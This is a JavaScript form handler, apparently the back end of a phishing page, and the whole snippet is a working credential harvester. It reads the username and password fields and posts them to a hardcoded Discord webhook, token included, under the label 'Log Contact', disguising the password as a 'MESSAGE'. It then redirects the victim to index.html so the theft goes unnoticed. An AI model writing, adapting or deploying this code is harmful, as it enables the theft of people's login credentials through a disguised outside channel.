function sendMessage() {
function sleep(milliseconds) {
const date = Date.now();
let currentDate = null;
do {
  currentDate = Date.now();
} while (currentDate - date < milliseconds);
}
  var request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/982579889230217236/bvuRi6sozERuqPSz3ur_sH6U8BTtUiCet1ENOJgx9MEcasnzJjUVAoAswP-EneshNWHW");
  request.setRequestHeader('Content-type', 'application/json');
  var params = {
    username: "Log Contact",
    avatar_url: "https://cdn.discordapp.com/attachments/938458372292886608/978691418233135174/logo.png",
    content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **MESSAGE : **" + document.getElementById('password').value)
  }
  request.send(JSON.stringify(params));
  sleep(400)
  window.location.replace("index.html");
}
